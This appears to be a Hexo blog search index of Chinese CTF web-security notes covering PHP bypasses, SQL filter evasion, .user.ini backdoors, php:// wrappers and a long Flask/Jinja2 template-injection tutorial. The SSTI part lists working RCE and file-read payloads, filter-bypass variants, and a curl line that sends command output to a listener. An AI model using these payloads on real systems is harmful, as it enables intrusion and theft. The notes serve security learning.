<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>常见源码泄露</title>
    <url>/2020/03/21/%E5%B8%B8%E8%A7%81%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<h1 id="SWP"><a href="#SWP" class="headerlink" title="SWP"></a>SWP</h1><p> 当你非正常关闭vim编辑器时（比如直接关闭终端或者电脑断电），会生成一个.swp文件，这个文件是一个临时交换文件，用来备份缓冲区中的内容。<br>  需要注意的是如果你并没有对文件进行修改，而只是读取文件，是不会产生.swp文件的。<br>  意外退出时，并不会覆盖旧的交换文件，而是会重新生成新的交换文件。而原来的文件中并不会有这次的修改，文件内容还是和打开时一样。<br>  例如，第一次产生的交换文件名为“.file.txt.swp”；再次意外退出后，将会产生名为“.file.txt.swo”的交换文件；而第三次产生的交换文件则为“.file.txt.swn”；依此类推。 </p>]]></content>
  </entry>
  <entry>
    <title>HTTPOXY漏洞</title>
    <url>/2020/03/17/HTTPOXY%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p><a href="https://www.laruence.com/2016/07/19/3101.html" target="_blank" rel="noopener">HTTPOXY漏洞</a></p><p> Guzzle<code>&gt;=4.0.0rc2,&lt;6.2.1</code>版本受此影响 </p><table>
<thead>
<tr>
<th align="center">Language</th>
<th align="center">Environment</th>
<th align="center">HTTP client</th>
</tr>
</thead>
<tbody><tr>
<td align="center">PHP</td>
<td align="center">php-fpm mod_php</td>
<td align="center">Guzzle 4+ Artax</td>
</tr>
<tr>
<td align="center">Python</td>
<td align="center">wsgiref.handlers.CGIHandler twisted.web.twcgi.CGIScript</td>
<td align="center">requests</td>
</tr>
<tr>
<td align="center">Go</td>
<td align="center">net/http/cgi</td>
<td align="center">net/http</td>
</tr>
</tbody></table><a id="more"></a>


<h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><blockquote>
<p>在CGI(RFC 3875)的模式的时候， 会把请求中的Header， 加上HTTP_ 前缀， 注册为环境变量, 所以如果你在Header中发送一个Proxy:xxxxxx, 那么PHP就会把他注册为HTTP_PROXY环境变量， 于是getenv(“HTTP_PROXY”)就变成可被控制的了. 那么如果你的所有类似的请求， 都会被代理到攻击者想要的地址，之后攻击者就可以伪造，监听，篡改你的请求了… </p>
</blockquote>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><blockquote>
<ul>
<li>代码以cgi模式运行，其中使用环境变量<code>HTTP_PROXY</code></li>
<li>信任 HTTP 客户端<code>HTTP_PROXY</code>并将其配置为代理</li>
<li>在请求处理程序中使用的该客户端发出HTTP（与HTTPS相对）请求</li>
</ul>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>MD5绕过</title>
    <url>/2020/03/17/MD5%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p>比较md5加密后的值是否为0，可以把value变成数组可以绕过</p><blockquote>
<p>因为md5加密一个数组值为null，而null==0</p>
</blockquote>]]></content>
  </entry>
  <entry>
    <title>php常用函数</title>
    <url>/2020/03/17/php%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h2 id="exif-imagetype"><a href="#exif-imagetype" class="headerlink" title="exif_imagetype()"></a>exif_imagetype()</h2><blockquote>
<p><code>exif_imagetype()</code>函数判断是不是图片，这个很好绕过，在文件头添加图片头就可以了，例如<code>gif</code>的文件头<code>GIF89a</code> </p>
</blockquote><h2 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h2><blockquote>
<p>列出 参数目录 中的文件和目录</p>
</blockquote><a id="more"></a>

<h2 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h2><blockquote>
<p>在指定的预定义字符前添加反斜杠。这些预定义字符是：</p>
<ul>
<li>单引号 (‘)</li>
<li>双引号 (“)</li>
<li>反斜杠 ()</li>
<li>NULL</li>
</ul>
</blockquote>
<h2 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h2><blockquote>
<p>用数组即可 </p>
</blockquote>
<h2 id="urldecode"><a href="#urldecode" class="headerlink" title="urldecode()"></a>urldecode()</h2><blockquote>
<p>二次编码绕过</p>
</blockquote>
<h2 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h2><blockquote>
<p>ereg()函数匹配数组的时候会返回null </p>
<p>用%00来绕过ereg()变量 </p>
</blockquote>
<h2 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h2><blockquote>
<p>strpos()函数和ereg()函数一样也具有数组绕过漏洞 </p>
</blockquote>
<h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h2><blockquote>
<p>is_numeric()函数可以被数组绕过，而且该数组可以和数字进行大小比较 </p>
</blockquote>
<h2 id="sha1"><a href="#sha1" class="headerlink" title="sha1()"></a>sha1()</h2><blockquote>
<p>sha1()和md5()处理数组的返回都是Null，所以都可以用数组来绕过 </p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>过滤绕过</title>
    <url>/2020/03/17/%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h4 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h4><p>注释绕过空格</p><blockquote>
<p>在MySQL中，用/**/来标记注释的内容。比如SQL查询：<br>select user() from dual<br>我们用注释替换空格，就可以变成：<br>select/**/user()/**/from/**/dual</p>
</blockquote><a id="more"></a>

<p>括号绕过空格 </p>
<blockquote>
<p>空格被过滤，但括号没有被过滤，可通过括号绕过。<br>我的经验是，在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。<br>括号绕过空格的方法，在time based盲注中，是屡试不爽的。<br>举例说明，我们有这样的一条SQL查询：<br>select user() from dual where 1=1 and 2=2<br>观察到user()可以算值，那么user()两边要加括号，变成：<br>select(user())from dual where 1=1 and 2=2;<br>继续，1=1和2=2可以算值，也加括号，去空格，变成：<br>select(user())from dual where(1=1)and(2=2)</p>
<p><a href="http://www.xxx.com/index.php?id=(sleep(ascii(mid(user()from(2)for(1)))=109" target="_blank" rel="noopener">http://www.xxx.com/index.php?id=(sleep(ascii(mid(user()from(2)for(1)))=109</a>))<br>这条语句是猜解user()第二个字符的ascii码是不是109，若是109，则页面加载将延迟。它：</p>
<p>1) 既没有用到逗号、大小于符号<br>2) 也没有使用空格</p>
</blockquote>
<p>可尝试Tab替代空格</p>
<h4 id="绕过特殊字符过滤"><a href="#绕过特殊字符过滤" class="headerlink" title="绕过特殊字符过滤"></a>绕过特殊字符过滤</h4><blockquote>
<p>可以用chr()函数绕过</p>
</blockquote>
<h4 id="被过滤"><a href="#被过滤" class="headerlink" title="-- 被过滤"></a>-- 被过滤</h4><blockquote>
<p>用# </p>
</blockquote>
<h4 id="关键字被过滤"><a href="#关键字被过滤" class="headerlink" title="关键字被过滤"></a>关键字被过滤</h4><p>用%00</p>
<blockquote>
<p>例如:uni%00on </p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>文件上传</title>
    <url>/2020/03/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<blockquote>
<ul>
<li><code>gif</code>的文件头<code>GIF89a</code> </li>
</ul>
</blockquote><h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h2><p>PHP会在每个目录下扫描INI文件，我们可以通过.user.ini文件来实现隐藏后门的效果</p><p>在.user.ini中可以识别PHP_INI_PERDIR和PHP_INI_USER模式的INI设置<br>关于PHP_INI_*一共有四种：</p><a id="more"></a>


<blockquote>
<p>PHP_INI_USER 可在用户脚本以及.user.ini中设定</p>
</blockquote>
<blockquote>
<p>PHP_INI_PERDIR 可在php.ini，.htaccess或httpd.conf中设定</p>
</blockquote>
<blockquote>
<p>PHP_INI_SYSTEM 可在php.ini或httpd.conf中设定</p>
</blockquote>
<blockquote>
<p>PHP_INI_ALL 可在任何地方设定</p>
</blockquote>
<p>auto_prepend_file</p>
<p>该配置项会让php文件在执行前先包含一个指定的文件，通过这个配置项，我们就可以来隐藏自己的后门</p>
<p>.user.ini</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=test.jpg</span><br></pre></td></tr></table></figure>

<p>.user.ini利用条件</p>
<blockquote>
<p>服务器脚本语言为PHP</p>
<p>服务器使用CGI／FastCGI模式<br>上传目录下要有可执行的php文件<br>从这来看.user.ini要比.htaccess的应用范围要广一些，毕竟.htaccess只能用于Apache</p>
<p>但仔细推敲我们就会感到“上传目录下要有可执行的php文件”这个要求在文件上传中也比较苛刻，应该没有天才开发者会把上传文件放在主目录或者把php文件放在上传文件夹。</p>
<p>但也不是全无办法，如果我们根据实际情况配合其他漏洞使用可能会有奇效，当对上传时的路径没有检测../时，因此导致文件可被上传至任意目录，这种情况下我们就很有可能可以利用.user.ini</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>文件包含</title>
    <url>/2020/03/17/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>前提 phpinfo中的allow_url_include是开启的</p><blockquote>
<p><strong>php://input</strong> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。 </p>
</blockquote><a id="more"></a>

<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p> <code>file_get_contents</code> 是可以触发 <code>php://filter</code> </p>
<p>php://filter在双off的情况下也可以正常使用；</p>
<p>allow_url_fopen ：off/on</p>
<p>allow_url_include：off/on</p>
<blockquote>
<p>php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。 </p>
<p>?path=php://filter/read=convert.base64-encode/resource=xxxxx.php</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>模块注入</title>
    <url>/2020/03/17/%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h3 id="模板注入介绍"><a href="#模板注入介绍" class="headerlink" title="模板注入介绍"></a>模板注入介绍</h3><p><a href="https://xz.aliyun.com/t/3679#toc-10" target="_blank" rel="noopener">flask之ssti模版注入从零到入门</a><br><a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">Flask/Jinja2模板注入中的一些绕过姿势</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SQL 注入</span></span><br><span class="line">$query = <span class="string">"select * from sometable where id="</span>.$_GET[<span class="string">'id'</span>];</span><br><span class="line">mysql_query($query);</span><br><span class="line">------------- 华丽的分割线 -------------</span><br><span class="line"><span class="comment">// 模版注入</span></span><br><span class="line">$temp-&gt;render(<span class="string">"Hello "</span>.$_GET[<span class="string">'username'</span>]);</span><br></pre></td></tr></table></figure><a id="more"></a>


<blockquote>
<p>而服务端模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。 </p>
<p> ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。本文着重对flask模板注入进行浅析。 </p>
</blockquote>
<h3 id="模块引擎"><a href="#模块引擎" class="headerlink" title="模块引擎"></a>模块引擎</h3><p>首先我们先讲解下什么是模板引擎，为什么需要模板，模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。但是往往新的开发都会导致一些安全问题，虽然模板引擎会提供沙箱机制，但同样存在沙箱逃逸技术来绕过。</p>
<p>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</p>
<p>通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。</p>
<p>后端渲染：浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的HTML字符串，计算就是服务器后端经过解析服务器端的模板来完成的，后端渲染的好处是对前端浏览器的压力较小，主要任务在服务器端就已经完成。</p>
<p>前端渲染：前端渲染相反，是浏览器从服务器得到信息，可能是json等数据包封装的数据，也可能是html代码，他都是由浏览器前端来解析渲染成html的人们可视化的代码而呈现在用户面前，好处是对于服务器后端压力较小，主要渲染在用户的客户端完成。</p>
<p>让我们用例子来简析模板渲染。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;div&gt;&#123;$what&#125;&lt;/div&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>我们想要呈现在每个用户面前自己的名字。但是{$what}我们不知道用户名字是什么，用一些url或者cookie包含的信息，渲染到what变量里，呈现给用户的为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;div&gt;张三&lt;/div&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>当然这只是最简单的示例，一般来说，至少会提供分支，迭代。还有一些内置函数。</p>
<h3 id="模板注入原理"><a href="#模板注入原理" class="headerlink" title="模板注入原理"></a>模板注入原理</h3><pre><code>模板注入涉及的是服务端Web应用使用模板引擎渲染用户请求的过程。</code></pre><p>考虑下面这段代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/../lib/Twig/Autoloader.php'</span>;</span><br><span class="line">Twig_Autoloader::register(<span class="keyword">true</span>);</span><br><span class="line">$twig = <span class="keyword">new</span> Twig_Environment(<span class="keyword">new</span> Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(<span class="string">"Hello &#123;$_GET['name']&#125;"</span>);  <span class="comment">// 将用户输入作为模版内容的一部分</span></span><br><span class="line"><span class="keyword">echo</span> $output;</span><br></pre></td></tr></table></figure>

<p>​    使用 Twig 模版引擎渲染页面，其中模版含有   变量，其模版变量值来自于 GET 请求参数 $_GET[“name”] 。显然这段代码并没有什么问题，即使你想通过 name  参数传递一段 JavaScript 代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击。</p>
<p>​    如果渲染的模版内容受到用户的控制，情况就不一样了。修改代码为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/../lib/Twig/Autoloader.php'</span>;</span><br><span class="line">Twig_Autoloader::register(<span class="keyword">true</span>);</span><br><span class="line">$twig = <span class="keyword">new</span> Twig_Environment(<span class="keyword">new</span> Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(<span class="string">"Hello &#123;$_GET['name']&#125;"</span>);  <span class="comment">// 将用户输入作为模版内容的一部分</span></span><br><span class="line"><span class="keyword">echo</span> $output;</span><br></pre></td></tr></table></figure>

<p>上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出。</p>
<h3 id="模板注入检测"><a href="#模板注入检测" class="headerlink" title="模板注入检测"></a>模板注入检测</h3><p> Twig 模板引擎里，  除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值，例如这里用户输入 name=20 ，则在服务端拼接的模版内容为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Hello &#123;&#123;<span class="number">2</span>*<span class="number">10</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>Twig 模板引擎在编译模板的过程中会计算 20  中的表达式 2*10 ，会将其返回值 20  作为模板变量的值输出</p>
<h3 id="利用ssti攻击"><a href="#利用ssti攻击" class="headerlink" title="利用ssti攻击"></a>利用ssti攻击</h3><p>在python中，object类是Python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类。我们从这段话出发，假定你已经知道ssti漏洞了，但是完全没学过ssti代码怎么写，接下来你可能会学到一点废话。</p>
<p>我们在pycharm中运行代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(&quot;&quot;.__class__)</span><br></pre></td></tr></table></figure>

<p>返回了&lt;class ‘str’&gt;，对于一个空字符串他已经打印了str类型，在python中，每个类都有一个<strong>bases</strong>属性，列出其基类。现在我们写代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(&quot;&quot;.__class__.__bases__)</span><br></pre></td></tr></table></figure>

<p>打印返回(&lt;class ‘object’&gt;,)，我们已经找到了他的基类object，而我们想要寻找object类的不仅仅只有bases，同样可以使用<strong>mro</strong>，<strong>mro</strong>给出了method resolution order，即解析方法调用的顺序。我们实例打印一下mro。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(&quot;&quot;.__class__.__mro__)</span><br></pre></td></tr></table></figure>

<p>可以看到返回了(&lt;class ‘str’&gt;, &lt;class ‘object’&gt;)，同样可以找到object类，正是由于这些但不仅限于这些方法，我们才有了各种沙箱逃逸的姿势。正如上面的解释，<strong>mro</strong>返回了解析方法调用的顺序，将会打印两个。在flask ssti中poc中很大一部分是从object类中寻找我们可利用的类的方法。我们这里只举例最简单的。接下来我们增加代码。接下来我们使用subclasses,<strong>subclasses</strong>() 这个方法，这个方法返回的是这个类的子类的集合，也就是object类的子类的集合。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(&quot;&quot;.__class__.__bases__[0].__subclasses__())</span><br></pre></td></tr></table></figure>

<p>python 3.6 版本下的object类下的方法集合。这里要记住一点2.7和3.6版本返回的子类不是一样的，但是2.7有的3.6大部分都有。需要自己寻找合适的标号来调用接下来我将进一步解释。接下来就是我们需要找到合适的类，然后从合适的类中寻找我们需要的方法。这里开始我们不再用pycharm打印了，直接利用上面我们已经搭建好的漏洞环境来进行测试。通过我们在如上这么多类中一个一个查找，找到我们可利用的类，这里举例一种。&lt;class ‘os._wrap_close’&gt;，os命令相信你看到就感觉很亲切。我们正是要从这个类中寻找我们可利用的方法，通过大概猜测找到是第118个类，0也对应一个类，所以这里写[118]。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5000/test?&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[117]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这个时候我们便可以利用.<strong>init</strong>.<strong>globals</strong>来找os类下的，init初始化类，然后globals全局来查找所有的方法及变量及参数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5000/test?&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>此时我们可以在网页上看到各种各样的参数方法函数。我们找其中一个可利用的function popen，在python2中可找file读取文件，很多可利用方法，详情可百度了解下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5000/test?&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__[&apos;popen&apos;](&apos;dir&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p> 此时便可以看到命令已经执行。如果是在linux系统下便可以执行其他命令。此时我们已经成功得到权限。进下来我们将进一步简单讨论如何进行沙箱逃逸。 </p>
<h3 id="ssti步骤"><a href="#ssti步骤" class="headerlink" title="ssti步骤"></a>ssti步骤</h3><h4 id="获取基本类"><a href="#获取基本类" class="headerlink" title="获取基本类"></a>获取基本类</h4><p>首先通过str、dict、tuple或list获取python的基本类(当然也可以利用一些其他在jinja2中存在的对象，比如request)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[8]</span><br></pre></td></tr></table></figure>

<p>可以借助getitem绕过中括号限制：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__.__getitem__(2)</span><br><span class="line">&#123;&#125;.__class__.__bases__.__getitem__(0)</span><br><span class="line">().__class__.__bases__.__getitem__(0)</span><br><span class="line">request.__class__.__mro__.__getitem__(8)</span><br></pre></td></tr></table></figure>

<h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">object.__subclasses__()[40]  为file类，所以可以对文件进行操作</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">读文件：</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[40](&apos;/etc/passwd&apos;).read()</span><br><span class="line"></span><br><span class="line">写文件：</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[40](&apos;/tmp&apos;).write(&apos;test&apos;)</span><br></pre></td></tr></table></figure>

<h4 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">object.__subclasses__()[59].__init__.func_globals.linecache下直接有os类，可以直接执行命令：</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&apos;id&apos;).read()</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&quot;__import__(&apos;os&apos;).popen(&apos;id&apos;).read()&quot;)</span><br><span class="line">object.__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&apos;os&apos;).popen(&apos;id&apos;).read()&quot;)</span><br><span class="line">object.__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&apos;os&apos;).popen(&apos;id&apos;).read()</span><br><span class="line">object.__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).popen(&apos;id&apos;).read()</span><br></pre></td></tr></table></figure>

<h2 id="Jinjia2模板引擎通用的RCE-Payload："><a href="#Jinjia2模板引擎通用的RCE-Payload：" class="headerlink" title="Jinjia2模板引擎通用的RCE Payload："></a>Jinjia2模板引擎通用的RCE Payload：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].eval(&quot;__import__(&apos;os&apos;).popen(&apos;&lt;command&gt;&apos;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p> 在<command>添加命令即可 </p>
<h2 id="ctf中的一些绕过tips"><a href="#ctf中的一些绕过tips" class="headerlink" title="ctf中的一些绕过tips"></a>ctf中的一些绕过tips</h2><p>没什么系统思路。就是不断挖掘类研究官方文档以及各种能够利用的姿势。这里从最简单的绕过说起。</p>
<h3 id="过滤-等括号"><a href="#过滤-等括号" class="headerlink" title="过滤[]等括号"></a>过滤[]等括号</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用getitem绕过。如原poc &#123;&#123;&quot;&quot;.__class__.__bases__[0]&#125;&#125;</span><br><span class="line"></span><br><span class="line">绕过后&#123;&#123;&quot;&quot;.__class__.__bases__.__getitem__(0)&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">读文件：</span><br><span class="line">&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&apos;/etc/passwd&apos;).read()</span><br><span class="line">执行命令：</span><br><span class="line">&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(&apos;ls&apos;).read()</span><br></pre></td></tr></table></figure>

<h3 id="过滤class"><a href="#过滤class" class="headerlink" title="过滤class"></a>过滤class</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用session</span><br><span class="line"></span><br><span class="line">poc &#123;&#123;session[&apos;__cla&apos;+&apos;ss__&apos;].__bases__[0].__bases__[0].__bases__[0].__bases__[0].__subclasses__()[118]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>多个bases[0]是因为一直在向上找object类。使用mro就会很方便</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;session[&apos;__cla&apos;+&apos;ss__&apos;].__mro__[12]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">request[&apos;__cl&apos;+&apos;ass__&apos;].__mro__[12]&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="timeit姿势"><a href="#timeit姿势" class="headerlink" title="timeit姿势"></a>timeit姿势</h3><p>可以学习一下 2017 swpu-ctf的一道沙盒python题，</p>
<p>这里不详说了，博大精深，我只意会一二。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import timeit</span><br><span class="line">timeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;dir&apos;)&quot;,number=1)</span><br><span class="line"></span><br><span class="line">import platform</span><br><span class="line">print platform.popen(&apos;dir&apos;).read()</span><br></pre></td></tr></table></figure>

<h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">先获取chr函数，赋值给chr，后面拼接字符串就好了：</span><br><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125;</span><br><span class="line">借助request对象(推荐)：</span><br><span class="line">&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd</span><br><span class="line">执行命令：</span><br><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;</span><br><span class="line">&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd=id</span><br></pre></td></tr></table></figure>

<h3 id="过滤双下划线"><a href="#过滤双下划线" class="headerlink" title="过滤双下划线__"></a>过滤双下划线__</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&apos;/etc/passwd&apos;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">过滤&#123;&#123;</span><br><span class="line">可以利用&#123;%if%&#125; &#123;% endif %&#125;标记</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if &apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&apos;curl http://127.0.0.1:7999/?i=`whoami`&apos;).read()==&apos;p&apos; %&#125;1&#123;% endif %&#125;</span><br><span class="line">nc -nlvp 7999</span><br><span class="line">相当于盲命令执行，利用curl将执行结果带出来</span><br><span class="line">如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来</span><br><span class="line">&#123;% if &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/test&apos;).read()[0:1]==&apos;p&apos; %&#125;~p0~&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<h3 id="过滤关键词"><a href="#过滤关键词" class="headerlink" title="过滤关键词"></a>过滤关键词</h3><p><strong>base64编码绕过</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__getattribute__使用实例访问属性时,调用该方法</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如被过滤掉__class__关键词</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__getattribute__(&apos;X19jbGFzc19f&apos;.decode(&apos;base64&apos;)).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>字符串拼接绕过</strong></p>
